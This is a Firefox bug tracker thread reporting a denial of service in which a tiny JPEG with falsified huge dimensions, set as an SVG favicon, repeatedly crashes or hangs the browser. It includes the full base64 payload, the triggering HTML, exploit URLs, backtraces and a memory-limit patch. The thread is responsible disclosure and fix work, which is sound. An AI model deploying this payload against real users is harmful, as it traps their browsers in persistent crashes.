| [tiny.jpg (memory bomb)](/attachment.cgi?id=9276192)  [3 years ago](#c11)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   1.37 KB, image/jpeg |  | [Details](/attachment.cgi?id=9276192&action=edit) |
| [bug1767194.svg (SVG containing tiny.jpg)](/attachment.cgi?id=9276195)  [3 years ago](#c12)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   2.19 KB, image/svg+xml |  | [Details](/attachment.cgi?id=9276195&action=edit) |
| [bug1767194.html testcase, but doesn't work in a hidden bug](/attachment.cgi?id=9276196)  [3 years ago](#c13)  [Daniel Veditz [:dveditz]](/user_profile?user_id=1689)   247 bytes, text/html |  | [Details](/attachment.cgi?id=9276196&action=edit) |
| [A single, self-contained html file to reproduce the crash in Firefox](/attachment.cgi?id=9276912)  [3 years ago](#c17)  [sam.z.ezeh](/user_profile?user_id=701580)   3.12 KB, text/html |  | [Details](/attachment.cgi?id=9276912&action=edit) |
| [sam-ezeh.patch](/attachment.cgi?id=9276914)  [3 years ago](#c18)  [sam.z.ezeh](/user_profile?user_id=701580)   567 bytes, patch |  | [Details](/attachment.cgi?id=9276914&action=edit) | [Diff](/attachment.cgi?id=9276914&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1767194&attachment=9276914) |
| [advisory.txt](/attachment.cgi?id=9331272)  [2 years ago](#c24)  [Tyson Smith [:tsmith]](/user_profile?user_id=486634)   112 bytes, text/plain |  | [Details](/attachment.cgi?id=9331272&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1767194#c0)• 3 years ago |
|  | |

# Summary

Upon loading a jpeg image with large dimensions, Firefox attempts to allocate a large amount of memory which in certain contexts can causes effects outside of the sandbox, causing Firefox to crash.

# System configuration

* Firefox Developer Edition 100.0b9 (64-bit)
* Linux kernel version 5.17.4

# Description

I was able create a single pixel image file of size 1.4kb. I then modified the binary image file data to list the dimensions of the image as 61680 x 61680. In order to render this image, Firefox attempts to allocate memory to store this image.

When a page that displays this image is rendered, the sandboxed tab crashes. However, when the image is viewed inside the Network Monitor, the Firefox application also crashes after it is killed by the OOM-killer.

# Proof of Concept

1. Loading the following image in the browser will cause the tab to crash: <https://exploit-py.herokuapp.com/tiny.jpg>
2. Opening the Network Monitor and previewing the image (e.g. by hovering over the image name) will cause Firefox to crash.

```
sam@samtop ~ % firefox-developer-edition
ATTENTION: default value of option mesa_glthread overridden by environment.
ATTENTION: default value of option mesa_glthread overridden by environment.
ATTENTION: default value of option mesa_glthread overridden by environment.
Corrupt JPEG data: premature end of data segment
Exiting due to channel error.
Exiting due to channel error.
Exiting due to channel error.
[1]    47893 killed     firefox-developer-edition
firefox-developer-edition  11.74s user 21.24s system 104% cpu 31.489 total
137 sam@samtop ~ %

```
## Relevant code

In `image/decoders/iccjpeg.c`

<https://hg.mozilla.org/mozilla-central/file/6e268f45bed2487cce05cfae5cabb7c1c8f415a6/image/decoders/iccjpeg.c#l159>

```
/* Allocate space for assembled data */
icc_data = (JOCTET*)malloc(total_length * sizeof(JOCTET));
if (icc_data == NULL) {
  return FALSE; /* oops, out of memory */
}

```

In `image/decoders/nsJPEGDecoder.cpp`

<https://hg.mozilla.org/mozilla-central/file/6e268f45bed2487cce05cfae5cabb7c1c8f415a6/image/decoders/nsJPEGDecoder.cpp#l839>

```
// Round up to multiple of 256 bytes.
const size_t roundup_buflen = ((new_backtrack_buflen + 255) >> 8) << 8;
JOCTET* buf = (JOCTET*)realloc(decoder->mBackBuffer, roundup_buflen);
// Check for OOM
if (!buf) {
  decoder->mInfo.err->msg_code = JERR_OUT_OF_MEMORY;
  my_error_exit((j_common_ptr)(&decoder->mInfo));
}

```

In `media/libjpeg/jdhuff.c`

<https://searchfox.org/mozilla-central/source/media/libjpeg/jdhuff.c#354-373>

```
no_more_bytes:
    /* We get here if we've read the marker that terminates the compressed
     * data segment.  There should be enough bits in the buffer register
     * to satisfy the request; if so, no problem.
     */
    if (nbits > bits_left) {
      /* Uh-oh.  Report corrupted data to user and stuff zeroes into
       * the data stream, so that we can produce some kind of image.
       * We use a nonvolatile flag to ensure that only one warning message
       * appears per data segment.
       */
      if (!cinfo->entropy->insufficient_data) {
        WARNMS(cinfo, JWRN_HIT_MARKER);
        cinfo->entropy->insufficient_data = TRUE;
      }
      /* Fill the buffer with zero bits */
      get_buffer <<= MIN_GET_BITS - bits_left;
      bits_left = MIN_GET_BITS;
    }
  }

```

`WARNMS(cinfo, JWRN_HIT_MARKER)` generates the `Corrupt JPEG data: premature end of data segment` message.

In general, when Linux is configured to overcommit memory (this is the default configuration), malloc doesn't return 0 when there is no memory left.

It is also possible for the OOM killer to kill a process that isn't Firefox that happens to be vital to the function of the Operating System causing an OS crash.

# Notes

In Chromium, upon loading this image does not crash. On chromium in certain contexts, the image with fail to load and is displayed as an invalid image file. In other contexts, the image will correctly be displayed as single pixel white image. This happens without causing excessive memory usage.

It's possible that images loaded from inside sandboxed tabs should not be loaded outside of the sandbox.

Flags: sec-bounty?

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a30403_406194)• 3 years ago |

Group: firefox-core-security → gfx-core-securityComponent: Security → ImageLibKeywords: [csectype-dos](/buglist.cgi?keywords=csectype-dos&resolution=---)Product: Firefox → Core

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1767194#c1)• 3 years ago |
|  | |

> It is also possible for the OOM killer to kill a process that isn't Firefox that happens to be vital to the function of the Operating System causing an OS crash.

That part doesn't sound like a Firefox problem.

We do happily kill off sandboxed processes doing strange things -- now you know that place sucks, and don't go back.

We do try to avoid crashes that kill the parent process; let's see what we can do here. Luckily it's devtools triggered so I won't affect most users in practice.

Status: UNCONFIRMED → NEWEver confirmed: trueKeywords: [sec-low](/buglist.cgi?keywords=sec-low&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1767194#c2)• 3 years ago |
|  | |

fwiw the testcase doesn't crash on my mac.

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1767194#c3)• 3 years ago |
|  | |

> Luckily it's devtools triggered so I won't affect most users in practice.

Loading the following page [1] will cause Firefox to crash as well. It's also relatively persistent as typing "secondary" into my URL bar or even just accessing today's browser history causes a crash.

The favicon is an SVG file that loads the image linked above.

[1]: <https://exploit-py.herokuapp.com/secondary.html>

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1767194#c4)• 3 years ago |
|  | |

On a fresh install, the page is displayed as a shortcut and Firefox becomes unusable.

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1767194#c5)• 3 years ago |
|  | |

I've just noticed the attachment section on this page. I'll reupload the documents directly to the bug tracker when I get the chance.

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1767194#c6)• 3 years ago |
|  | |

Attached file
[HTML Page with favicon set to an SVG containing the JPEG image](attachment.cgi?id=9275127) (obsolete)
— [Details](attachment.cgi?id=9275127&action=edit)

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1767194#c7)• 3 years ago |
|  | |

Attached file
[SVG file containing JPEG image data](attachment.cgi?id=9275128) (obsolete)
— [Details](attachment.cgi?id=9275128&action=edit)

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1767194#c8)• 3 years ago |
|  | |

Oh, it looks like that only uploaded a document containing a link to the files.

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1767194#c9)• 3 years ago |
|  | |

Here is the text content of the web page.

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title> Web page </title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
  </head>
  <body>
    page content
  </body>
</html>

```

The following is the content of the SVG favicon.

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="5cm" height="4cm" version="1.1"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/4QCwRXhpZgAATU0AKgAAAAgABQEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAAITAAMAAAABAAEAAIdpAAQAAAABAAAAWgAAAAAAAAEsAAAAAQAAASwAAAABAAaQAAAHAAAABDAyMzKRAQAHAAAABAECAwCgAAAHAAAABDAxMDCgAQADAAAAAf//AACgAgADAAAAAf//AACgAwADAAAAAf//AAAAAAAA//4AE0NyZWF0ZWQgd2l0aCBHSU1Q/+ICsElDQ19QUk9GSUxFAAEBAAACoGxjbXMEMAAAbW50clJHQiBYWVogB+YAAgAUABAAAgAvYWNzcEFQUEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPbWAAEAAAAA0y1sY21zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANZGVzYwAAASAAAABAY3BydAAAAWAAAAA2d3RwdAAAAZgAAAAUY2hhZAAAAawAAAAsclhZWgAAAdgAAAAUYlhZWgAAAewAAAAUZ1hZWgAAAgAAAAAUclRSQwAAAhQAAAAgZ1RSQwAAAhQAAAAgYlRSQwAAAhQAAAAgY2hybQAAAjQAAAAkZG1uZAAAAlgAAAAkZG1kZAAAAnwAAAAkbWx1YwAAAAAAAAABAAAADGVuVVMAAAAkAAAAHABHAEkATQBQACAAYgB1AGkAbAB0AC0AaQBuACAAcwBSAEcAQm1sdWMAAAAAAAAAAQAAAAxlblVTAAAAGgAAABwAUAB1AGIAbABpAGMAIABEAG8AbQBhAGkAbgAAWFlaIAAAAAAAAPbWAAEAAAAA0y1zZjMyAAAAAAABDEIAAAXe///zJQAAB5MAAP2Q///7of///aIAAAPcAADAblhZWiAAAAAAAABvoAAAOPUAAAOQWFlaIAAAAAAAACSfAAAPhAAAtsRYWVogAAAAAAAAYpcAALeHAAAY2XBhcmEAAAAAAAMAAAACZmYAAPKnAAANWQAAE9AAAApbY2hybQAAAAAAAwAAAACj1wAAVHwAAEzNAACZmgAAJmcAAA9cbWx1YwAAAAAAAAABAAAADGVuVVMAAAAIAAAAHABHAEkATQBQbWx1YwAAAAAAAAABAAAADGVuVVMAAAAIAAAAHABzAFIARwBC/9sAQwADAgIDAgIDAwMDBAMDBAUIBQUEBAUKBwcGCAwKDAwLCgsLDQ4SEA0OEQ4LCxAWEBETFBUVFQwPFxgWFBgSFBUU/9sAQwEDBAQFBAUJBQUJFA0LDRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU/8IAEQjw8PDwAwERAAIRAQMRAf/EABQAAQAAAAAAAAAAAAAAAAAAAAj/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAFUn//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAQUCf//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Bf//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQIBAT8Bf//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEABj8Cf//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAT8hf//aAAwDAQACAAMAAAAQn//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Qf//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQIBAT8Qf//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAT8Qf//Z" x="0" y="0" height="50px" width="50px"/>
</svg>

```
> fwiw the testcase doesn't crash on my mac.

I should have clarified earlier that I only expect this to cause a crash on Linux systems. I have observed excess memory usage on Windows using the Task Manager but loading the image didn't lead to a crash. Using `gnome-system-monitor` on the Linux installation also displayed excess memory usage and loading the image led to a crash.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1767194#c10)• 3 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #1](/show_bug.cgi?id=1767194#c1 "VERIFIED FIXED - persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large"))

> We do try to avoid crashes that kill the parent process; let's see what we can do here. Luckily it's devtools triggered so I won't affect most users in practice.

Do we need to re-evaluate the sec-low in light of [comment #3](/show_bug.cgi?id=1767194#c3 "VERIFIED FIXED - persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large") (using favicons to get this to hit the parent) ?

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1767194#c11)• 3 years ago |
|  | |

Attached image
[tiny.jpg (memory bomb)](attachment.cgi?id=9276192)
— [Details](attachment.cgi?id=9276192&action=edit)

Flags: needinfo?(dveditz)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a925173_1689)• 3 years ago |

[Attachment #9275127](/attachment.cgi?id=9275127&action=edit "HTML Page with favicon set to an SVG containing the JPEG image") -
Attachment is obsolete: true

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a925190_1689)• 3 years ago |

[Attachment #9275128](/attachment.cgi?id=9275128&action=edit "SVG file containing JPEG image data") -
Attachment is obsolete: true

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1767194#c12)• 3 years ago |
| duplicate | |

| Comment hidden (duplicate) |  |
| --- | --- |

Attached image
[bug1767194.svg (SVG containing tiny.jpg)](attachment.cgi?id=9276195)
— [Details](attachment.cgi?id=9276195&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1767194#c13)• 3 years ago |
| duplicate | |

| Comment hidden (duplicate) |  |
| --- | --- |

Attached file
[bug1767194.html testcase, but doesn't work in a hidden bug](attachment.cgi?id=9276196)
— [Details](attachment.cgi?id=9276196&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1767194#a926868_1689)• 3 years ago |

[Attachment #9276196](/attachment.cgi?id=9276196&action=edit "bug1767194.html   testcase, but doesn't work in a hidden bug") -
Attachment description: bug1767194.html DOS on open!!! → bug1767194.html testcase, but doesn't work in a hidden bug

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1767194#c14)• 3 years ago |
|  | |

With the testcase in [comment 3](/show_bug.cgi?id=1767194#c3 "VERIFIED FIXED - persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large") my mac does hang the parent process for 30 seconds or so. And as mentioned in that comment I see the problem again (hang for me) when the awesomebar tries to display a match, and another hang when I open any of the various ways to open history (Hamburger or library toolbar icon menu, sidebar, old "Show all History" dialog). After I had opened the testcase on heroku and again on a local server the hang opening History was twice as long.

In my case I could "fix" the problem by deleting the entries from the history dialog once I'd waited out the hang. If this is instead a crash as described for Linux then users would be pretty stuck. If they can avoid crashing on start-up (see comment about how it gets incorporated into the new-tab page in a fresh profile since nothing else is there) users could go straight to the "Clear Recent History" menu item and get rid of the entries that way. Otherwise, the places database is not something a typical user can edit outside of Firefox itself so they're stuck.

> Do we need to re-evaluate the sec-low in light of [comment #3](/show_bug.cgi?id=1767194#c3 "VERIFIED FIXED - persistent browser DoS via favicon containing a small JPEG images that list their image dimensions as large") (using favicons to get this to hit the parent) ?

It does turn a simple crash into a persistent DOS for affected users. It's worse as a usability problem than a "security" one, but we can raise the severity.

Blocks: [eviltraps](/show_bug.cgi?id=432687 "NEW - [meta] Protect users from websites that trap them or destroy their experience")Severity: -- → S2Keywords: [sec-low](/buglist.cgi?keywords=sec-low&resolution=---) → [crash](/buglist.cgi?keywords=crash&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1767194#c15)• 3 years ago |
|  | |

The backtrace indicates firefox gets stuck in `DoDecode` in `nsJPEGDecoder.cpp` when it calls `ReadJPEGData`.

# nsJPEGDecoder.cpp

## DoDecode

```
LexerResult nsJPEGDecoder::DoDecode(SourceBufferIterator& aIterator,
                                    IResumable* aOnResume) {
  MOZ_ASSERT(!HasError(), "Shouldn't call DoDecode after error!");

  return mLexer.Lex(aIterator, aOnResume,
                    [=](State aState, const char* aData, size_t aLength) {
                      switch (aState) {
                        case State::JPEG_DATA:
                          return ReadJPEGData(aData, aLength);
                        case State::FINISHED_JPEG_DATA:
                          return FinishedJPEGData();
                      }
                      MOZ_CRASH("Unknown State");
                    });
}

```
## ReadJPEGData

```
LexerTransition<nsJPEGDecoder::State> nsJPEGDecoder::ReadJPEGData(
    const char* aData, size_t aLength) {
      ...
      mInfo.dct_method = JDCT_ISLOW;
      mInfo.dither_mode = JDITHER_FS;
      mInfo.do_fancy_upsampling = TRUE;
      mInfo.enable_2pass_quant = FALSE;
      mInfo.do_block_smoothing = TRUE;

      // Step 5: Start decompressor
      if (jpeg_start_decompress(&mInfo) == FALSE) {
        MOZ_LOG(sJPEGDecoderAccountingLog, LogLevel::Debug,
                ("} (I/O suspension after jpeg_start_decompress())"));
        return Transition::ContinueUnbuffered(
            State::JPEG_DATA);  // I/O suspension
      }
    ...
    case JPEG_DECOMPRESS_PROGRESSIVE: {
        ...
        do {
          status = jpeg_consume_input(&mInfo);

          if (status == JPEG_REACHED_SOS || status == JPEG_REACHED_EOI ||
              status == JPEG_SUSPENDED) {
            // record the first scan where all components are present
            all_components_seen = AllComponentsSeen(mInfo);
            if (!scan_to_display_first && all_components_seen) {
              scan_to_display_first = mInfo.input_scan_number;
            }
          }
        } while ((status != JPEG_SUSPENDED) && (status != JPEG_REACHED_EOI));

```

I think setting `mInfo->mem->max_memory_to_use` to a reasonable value will resolve this.

# Backtraces

## First backtrace

```
#0  0x00007ffff7b9adc0 in  () at /usr/lib/libc.so.6
#1  0x000055555562f7c4 in __asan_memset() ()
    at /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:26
#2  0x00007fffe060a94e in jzero_far () at /builds/worker/checkouts/gecko/media/libjpeg/jutils.c:132
#3  0x00007fffe05fbfa1 in access_virt_barray () at /builds/worker/checkouts/gecko/media/libjpeg/jmemmgr.c:964
#4  0x00007fffe0586a91 in consume_data () at /builds/worker/checkouts/gecko/media/libjpeg/jdcoefct.c:205
#5  0x00007fffda309687 in ReadJPEGData() () at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:464
#6  0x00007fffda385dd5 in operator() () at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:186
#7  ContinueUnbufferedRead<(lambda at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:183:21)>(void)
    () at /builds/worker/checkouts/gecko/image/StreamingLexer.h:555
#8  0x00007fffda3066f8 in UnbufferedRead<(lambda at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:183:21)> () at /builds/worker/checkouts/gecko/image/StreamingLexer.h:501
#9  Lex<(lambda at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:183:21)> ()
    at /builds/worker/checkouts/gecko/image/StreamingLexer.h:469
#10 DoDecode() () at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:182
#11 0x00007fffda1f697c in Decode() () at /builds/worker/checkouts/gecko/image/Decoder.cpp:177
#12 0x00007fffda205f27 in Run() () at /builds/worker/checkouts/gecko/image/DecodedSurfaceProvider.cpp:125
#13 0x00007fffda2050e9 in SyncRunIfPossible() () at /builds/worker/checkouts/gecko/image/DecodePool.cpp:193

```
## Second backtrace

```
#0  0x00007ffff7b9adc0 in  () at /usr/lib/libc.so.6
#1  0x00005555555b19bc in Allocate() ()
    at /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:588
#2  0x00005555555af5c4 in asan_malloc() ()
    at /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:953
#3  0x00005555556301be in __interceptor_malloc() ()
    at /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:70
#4  0x00007fffe05f9d9e in alloc_large () at /builds/worker/checkouts/gecko/media/libjpeg/jmemmgr.c:385
#5  0x00007fffe05fa2fc in alloc_barray () at /builds/worker/checkouts/gecko/media/libjpeg/jmemmgr.c:521
#6  0x00007fffe05fb131 in realize_virt_arrays () at /builds/worker/checkouts/gecko/media/libjpeg/jmemmgr.c:735
#7  0x00007fffe05ba788 in master_selection () at /builds/worker/checkouts/gecko/media/libjpeg/jdmaster.c:561
#8  jinit_master_decompress () at /builds/worker/checkouts/gecko/media/libjpeg/jdmaster.c:725
#9  0x00007fffe057fdc2 in jpeg_start_decompress () at /builds/worker/checkouts/gecko/media/libjpeg/jdapistd.c:49
#10 0x00007fffda3091f5 in ReadJPEGData() () at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:400
#11 0x00007fffda385dd5 in operator() () at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:186
#12 ContinueUnbufferedRead<(lambda at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:183:21)>(void)
    () at /builds/worker/checkouts/gecko/image/StreamingLexer.h:555
#13 0x00007fffda3066f8 in UnbufferedRead<(lambda at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:183:21)> () at /builds/worker/checkouts/gecko/image/StreamingLexer.h:501
#14 Lex<(lambda at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:183:21)> ()
    at /builds/worker/checkouts/gecko/image/StreamingLexer.h:469
#15 DoDecode() () at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:182

```
# Third backtrace using the debug build

```
#0  0x00007ffff7b9adc0 in  () at /usr/lib/libc.so.6
#1  0x0000555555640234 in __asan_memset() ()
    at /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:26
#2  0x00007fffd3eba69e in jzero_far (target=0x7ff9aa87eba0, bytestozero=140710284083200)
    at /builds/worker/checkouts/gecko/media/libjpeg/jutils.c:132
#3  0x00007fffd3eb0a66 in access_virt_barray
    (cinfo=0x61c00047e2b0, ptr=0x629001ac8540, start_row=891, num_rows=<optimized out>, writable=1)
    at /builds/worker/checkouts/gecko/media/libjpeg/jmemmgr.c:964
#4  0x00007fffd3e53b0d in consume_data (cinfo=0x61c00047e2b0)
    at /builds/worker/checkouts/gecko/media/libjpeg/jdcoefct.c:205
#5  0x00007fffd3e4bd28 in jpeg_consume_input (cinfo=0x61c00047e2b0)
    at /builds/worker/checkouts/gecko/media/libjpeg/jdapimin.c:333
#6  0x00007fffc88e7f7d in mozilla::image::nsJPEGDecoder::ReadJPEGData(char const*, unsigned long)
    (this=0x61c00047e080, aData=<optimized out>, aLength=<optimized out>)
    at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:464
#7  0x00007fffc899d7b9 in mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8::operator()(mozilla::image::nsJPEGDecoder::State, char const*, unsigned long) const
    (aState=<optimized out>, aData=0x7ff9aa7fc000 "", aLength=3, this=<optimized out>)
    at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:186
#8  mozilla::image::StreamingLexer<mozilla::image::nsJPEGDecoder::State, 16ul>::ContinueUnbufferedRead<mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8>(char const*, unsigned long, unsigned long, mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8)
    (this=0x61c00047e208, aData=<optimized out>, aLength=<optimized out>, aChunkLength=<optimized out>, aFunc=...)
    at /builds/worker/checkouts/gecko/image/StreamingLexer.h:555
#9  0x00007fffc88e352b in mozilla::image::StreamingLexer<mozilla::image::nsJPEGDecoder::State, 16ul>::UnbufferedRead<mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8>(mozilla::image::SourceBufferIterator&, mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8) (this=0x0, aIterator=..., aFunc=...)
    at /builds/worker/checkouts/gecko/image/StreamingLexer.h:501
#10 mozilla::image::StreamingLexer<mozilla::image::nsJPEGDecoder::State, 16ul>::Lex<mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8>(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*, mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)::$_8) (this=0x0, aIterator=..., aOnResume=0x61200001e9c0, aFunc=...)
    at /builds/worker/checkouts/gecko/image/StreamingLexer.h:469
#11 mozilla::image::nsJPEGDecoder::DoDecode(mozilla::image::SourceBufferIterator&, mozilla::image::IResumable*)
    (this=0x3c38, aIterator=<optimized out>, aOnResume=<optimized out>)
    at /builds/worker/checkouts/gecko/image/decoders/nsJPEGDecoder.cpp:182

```

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1767194#c16)• 3 years ago |
|  | |

I've built firefox with this patch and the issue is resolved.

```
diff --git a/image/decoders/nsJPEGDecoder.cpp b/image/decoders/nsJPEGDecoder.cpp
--- a/image/decoders/nsJPEGDecoder.cpp
+++ b/image/decoders/nsJPEGDecoder.cpp
@@ -396,6 +396,9 @@ LexerTransition<nsJPEGDecoder::State> ns
       mInfo.enable_2pass_quant = FALSE;
       mInfo.do_block_smoothing = TRUE;

+      // Use a maximum of 100MB while loading images
+      mInfo.mem->max_memory_to_use = 100 * 1024 * 1024;
+
       // Step 5: Start decompressor
       if (jpeg_start_decompress(&mInfo) == FALSE) {
         MOZ_LOG(sJPEGDecoderAccountingLog, LogLevel::Debug,

```

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1767194#c17)• 3 years ago |
|  | |

Attached file
[A single, self-contained html file to reproduce the crash in Firefox](attachment.cgi?id=9276912)
— [Details](attachment.cgi?id=9276912&action=edit)

I've attached a more minimal html test case that reproduces the crash without requiring an external SVG file

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1767194#c18)• 3 years ago |
|  | |

Attached patch

[sam-ezeh.patch](attachment.cgi?id=9276914&action=diff)
— [Details](attachment.cgi?id=9276914&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1767194&attachment=9276914)

My only thought right now is that the 100MB limit could be reduced even further.

|  | [sam.z.ezeh](/user_profile?user_id=701580)  Reporter |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1767194#c19)• 3 years ago |
|  | |

Normally I submit tests with patches but I'm quite unfamiliar with the firefox test suite and I'm not sure how I'd integrate the example file. The following query however seems to suggest there isn't any more of this specific issue when processing jpeg images.

```
match cxxMethodDecl(
    hasDescendant(
        callExpr(
            callee(
                functionDecl(
                    hasName("jpeg_start_decompress")
                 )
             )
         )
     ),
     unless(
        hasDescendant(
            binaryOperator(
                isAssignmentOperator(),
                hasLHS(
                    memberExpr(
                        member(
                            hasName("max_memory_to_use")
                        )
                    )
                )
            )
        )
     )
 )

```

|  | [Timothy Nikkel (:tnikkel)](/user_profile?user_id=255010)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1767194#c20)• 2 years ago |
|  | |

Probably the issue is already filed as one of [bug 1277397](/show_bug.cgi?id=1277397 "RESOLVED FIXED - High memory usage triggered by a jpg"), [bug 1252200](/show_bug.cgi?id=1252200 "NEW - libjpeg-turbo: DoS via small Image with large Dimensions"), [bug 1462008](/show_bug.cgi?id=1462008 "NEW - Small jpeg triggers runaway memory usage in Firefox 59 -> Nightly").

